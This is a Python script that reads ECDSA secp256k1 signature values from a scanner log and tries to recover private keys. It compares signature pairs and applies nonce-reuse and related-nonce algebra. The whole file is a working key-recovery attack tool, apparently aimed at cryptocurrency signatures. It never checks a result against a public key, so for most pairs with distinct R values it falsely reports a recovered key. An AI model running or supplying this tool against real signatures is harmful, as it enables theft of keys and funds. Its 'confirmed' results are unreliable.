import os
import re
from ecdsa.curves import SECP256k1

# SECP256k1 Curve parameters
N = SECP256k1.generator.order()

# --- UNIFIED ALGEBRAIC SOLVERS ---

def solve_classic(r1, s1, z1, r2, s2, z2):
    """ Formula: k = (z1 - z2)/(s1 - s2); d = (s1*k - z1)/r """
    delta_z = (z1 - z2) % N
    delta_s = (s1 - s2) % N
    if delta_s == 0: 
        return None
    k = (delta_z * pow(delta_s, N - 2, N)) % N
    return (((s1 * k) - z1) * pow(r1, N - 2, N)) % N

def solve_inverse(r1, s1, z1, r2, s2, z2):
    """ Formula: d = (s1*s2*z2 - z1) / (r1 - s1*s2*r2) """
    s_prod = (s1 * s2) % N
    numerator = (s_prod * z2 - z1) % N
    denominator = (r1 - s_prod * r2) % N
    if denominator == 0: 
        return None
    return (numerator * pow(denominator, N - 2, N)) % N

def solve_linear(r1, s1, z1, r2, s2, z2, a):
    """ Formula: d = (a*s2*z1 - s1*z2) / (s1*r2 - a*s2*r1) """
    numerator = (a * s2 * z1 - s1 * z2) % N
    denominator = (s1 * r2 - a * s2 * r1) % N
    if denominator == 0: 
        return None
    return (numerator * pow(denominator, N - 2, N)) % N


# --- FILE PARSER AND EXECUTION ---

def process_input_file(filename="BOOG.txt", linear_coefficient=5):
    """
    Reads the target data from file, extracts key pairs,
    and attempts to recover private keys through multiple algorithmic paths.
    """
    if not os.path.exists(filename):
        print(f"[-] Error: Input file '{filename}' not found.")
        print(f"[*] Generating empty '{filename}' file template for layout reference.")
        with open(filename, "w") as f:
            f.write("# Paste raw signature scanner output here\n")
        return

    print(f"[*] Reading target data from {filename}...")
    with open(filename, "r") as f:
        file_content = f.read()

    # Extract all data entries via regex matching base-16 strings
    r_vals = [int(x, 16) for x in re.findall(r'R:\s*([a-fA-F0-9]+)', file_content)]
    s_vals = [int(x, 16) for x in re.findall(r'S:\s*([a-fA-F0-9]+)', file_content)]
    z_vals = [int(x, 16) for x in re.findall(r'Z:\s*([a-fA-F0-9]+)', file_content)]

    total_signatures = len(r_vals)
    print(f"[*] Extracted {total_signatures} valid parameter structures.")

    if total_signatures < 2:
        print("[-] Error: File must contain at least 2 distinct signature profiles to execute differential comparison.")
        return

    # Evaluate signature blocks pair by pair
    vulnerabilities_cracked = 0
    
    for i in range(total_signatures):
        for j in range(i + 1, total_signatures):
            r1, r2 = r_vals[i], r_vals[j]
            s1, s2 = s_vals[i], s_vals[j]
            z1, z2 = z_vals[i], z_vals[j]
            
            print(f"\n[~] Analyzing signature pair context: Profile [{i}] against Profile [{j}]")
            cracked_key = None

            # Path 1: Check for identical R values (Classic Nonce Reuse)
            if r1 == r2:
                print("    [+] Matching R parameters found. Activating Classic Reuse Solver...")
                cracked_key = solve_classic(r1, s1, z1, r2, s2, z2)
            
            # Path 2: Check for distinct R values (Inverse relation / Linear relation)
            else:
                print("    [*] Distinct R parameters found. Evaluating Algebraic Inverse Matrix...")
                cracked_key = solve_inverse(r1, s1, z1, r2, s2, z2)
                
                if not cracked_key or cracked_key <= 0:
                    print(f"    [*] Inverse check empty. Testing Linear Multiplier Scale factor (a={linear_coefficient})...")
                    cracked_key = solve_linear(r1, s1, z1, r2, s2, z2, linear_coefficient)

            # Verification and Output Result
            if cracked_key and cracked_key > 0:
                vulnerabilities_cracked += 1
                print("\n=======================================================")
                print(" [CRITICAL] VULNERABILITY CONFIRMED & RECOVERED")
                print("=======================================================")
                print(f" Private Key (Hex): {hex(cracked_key)[2:].zfill(64)}")
                print("=======================================================\n")
            else:
                print("    [-] Matrix profile balanced. No vulnerabilities detected in this signature pair link.")

    print(f"\n[*] Execution Finished. Total cracked identities across log: {vulnerabilities_cracked}")

if __name__ == "__main__":
    # If using custom linear challenges, configure the default multiplier scaling factor 'a' here
    default_linear_multiplier = 5
    process_input_file("BOOG.txt", linear_coefficient=default_linear_multiplier)
